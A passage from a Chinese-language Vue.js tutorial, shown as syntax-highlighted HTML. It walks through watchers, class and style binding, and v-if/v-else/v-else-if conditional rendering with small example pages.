operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>str1<span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span>str2<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-2-侦听器"><a href="#5-2-侦听器" class="headerlink" title="5.2 侦听器"></a>5.2 侦听器</h4><blockquote><p>侦听器，就是data中属性的监听器，当data中的属性值发生变化就会触发侦听器函数的执行</p></blockquote><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/vue.js<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>str1<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>str2<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span>{{str3}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">{</span>str1<span class="token operator">:</span><span class="token string">"千锋"</span><span class="token punctuation">,</span>str2<span class="token operator">:</span><span class="token string">"武汉"</span><span class="token punctuation">,</span>str3<span class="token operator">:</span><span class="token string">"千锋武汉"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>watch<span class="token operator">:</span><span class="token punctuation">{</span><span class="token function-variable function">str1</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>str3 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>str1 <span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span>str2<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token function-variable function">str2</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>str3 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>str1 <span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span>str2<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="六、class与style绑定"><a href="#六、class与style绑定" class="headerlink" title="六、class与style绑定"></a>六、class与style绑定</h2><blockquote><p>我们可以使用mustache语法将vue中data的数据绑定到HTML标签及标签的属性，如何将data中的值绑定到标签的class及style属性呢？</p></blockquote><h4 id="6-1-class绑定"><a href="#6-1-class绑定" class="headerlink" title="6.1 class绑定"></a>6.1 class绑定</h4><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">.mystyle1</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span><span class="token property">background</span><span class="token punctuation">:</span> orange<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.mystyle3</span><span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span><span class="token property">background</span><span class="token punctuation">:</span> black<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.my-style2</span><span class="token punctuation">{</span><span class="token property">border-radius</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/vue.js<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--如果b1为true就加载 mystyle1；如果b2为true，则加载my-style2--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">:class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>{mystyle1:b1,<span class="token punctuation">'</span>my-style2<span class="token punctuation">'</span>:b2}<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--为class属性加载多个样式名 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">:class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>[chooseStyle1,chooseStyle2]<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--如果b3为true，则class='mystyle3'; 否则class='mystyle1'如果在三目运算中使用样式名则需加单引号，不加单引号则表示从data变量中获取样式名--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">:class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>[b3 ? <span class="token punctuation">'</span>mystyle3<span class="token punctuation">'</span> : <span class="token punctuation">'</span>mystyle1<span class="token punctuation">'</span>]<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">:class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>[b3 ? chooseStyle3 : chooseStyle1]<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">{</span>b1<span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span>b2<span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span>b3<span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span>chooseStyle1<span class="token operator">:</span><span class="token string">"mystyle1"</span><span class="token punctuation">,</span>chooseStyle2<span class="token operator">:</span><span class="token string">"my-style2"</span><span class="token punctuation">,</span>chooseStyle3<span class="token operator">:</span><span class="token string">"mystyle3"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="6-2-style绑定"><a href="#6-2-style绑定" class="headerlink" title="6.2 style绑定"></a>6.2 style绑定</h4><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/vue.js<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--当使用v-bind绑定内联样式时：1. 使用{}定义style样式，才能获取data中的值，{}要遵循JSON格式2. {}中不在使用style样式属性名“font-size”,而要使用对应的js属性名border-style-width ---  borderStyleWidth--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">v-bind:</span></span><span class="token style-attr language-css"><span class="token attr-name"><span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token punctuation">{</span><span class="token property">color</span><span class="token punctuation">:</span> colorname<span class="token punctuation">,</span><span class="token property">fontSize</span><span class="token punctuation">:</span> fontsize+<span class="token string">'px'</span> <span class="token punctuation">}</span></span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>WH2010<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--我们可以直接为style属性绑定一个data中定义好的内联样式的字符串--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">v-bind:</span></span><span class="token style-attr language-css"><span class="token attr-name"><span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value">mystyle1</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>千锋Java-WH2010<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--我们可以直接为style属性绑定一个data中定义好的内联样式的对象--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">v-bind:</span></span><span class="token style-attr language-css"><span class="token attr-name"><span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value">mystyle2</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>千锋Java-WH2010<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--可以在同一个style上通过数组引用多个内联样式的对象--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">v-bind:</span></span><span class="token style-attr language-css"><span class="token attr-name"><span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value">[mystyle2<span class="token punctuation">,</span>mystyle3]</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>千锋Java-WH2010<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">{</span>colorname<span class="token operator">:</span><span class="token string">"green"</span><span class="token punctuation">,</span>fontsize<span class="token operator">:</span><span class="token number">30</span><span class="token punctuation">,</span>mystyle1<span class="token operator">:</span><span class="token string">"color:orange;font-size:45px"</span><span class="token punctuation">,</span>mystyle2<span class="token operator">:</span><span class="token punctuation">{</span>color<span class="token operator">:</span><span class="token string">"blue"</span><span class="token punctuation">,</span>fontSize<span class="token operator">:</span><span class="token string">"40px"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>mystyle3<span class="token operator">:</span><span class="token punctuation">{</span>textShadow<span class="token operator">:</span><span class="token string">"orange 3px 3px 5px"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="七、条件与列表渲染"><a href="#七、条件与列表渲染" class="headerlink" title="七、条件与列表渲染"></a>七、条件与列表渲染</h2><h4 id="7-1-条件渲染"><a href="#7-1-条件渲染" class="headerlink" title="7.1 条件渲染"></a>7.1 条件渲染</h4><h6 id="7-1-1-v-if"><a href="#7-1-1-v-if" class="headerlink" title="7.1.1 v-if"></a>7.1.1 v-if</h6><blockquote><p>在html标签可以添加v-if指令指定一个条件，如果条件成立则显示此HTML标签，如果不成立则不显示当前标签；</p><p>条件可以是一个表达式也可以是一个具体的bool类型值</p></blockquote><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/vue.js<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span> <span class="token attr-name">v-if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>b<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>从前有座山<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span> <span class="token attr-name">v-if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>code == 1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>从前有座山<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">{</span>code<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">,</span>b<span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="7-1-2-v-else"><a href="#7-1-2-v-else" class="headerlink" title="7.1.2 v-else"></a>7.1.2 v-else</h6><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!--v-else标签需要紧跟在v-if的标签之后，中间不能有其他标签--&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span> <span class="token attr-name">v-if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>code == 1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>从前有座山<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span> <span class="token attr-name">v-else</span><span class="token punctuation">&gt;</span></span>山里有座庙<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>        data<span class="token operator">:</span><span class="token punctuation">{</span>            code<span class="token operator">:</span><span class="token number">1</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="7-1-3-v-else-if"><a href="#7-1-3-v-else-if" class="headerlink" title="7.1.3 v-else-if"></a>7.1.3 v-else-if</h6><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span> <span class="token attr-name">v-if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>code &gt;= 90<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>优秀<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span> <span class="token attr-name">v-else-if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>code &gt;= 80<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>良好<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span>    <span class="token 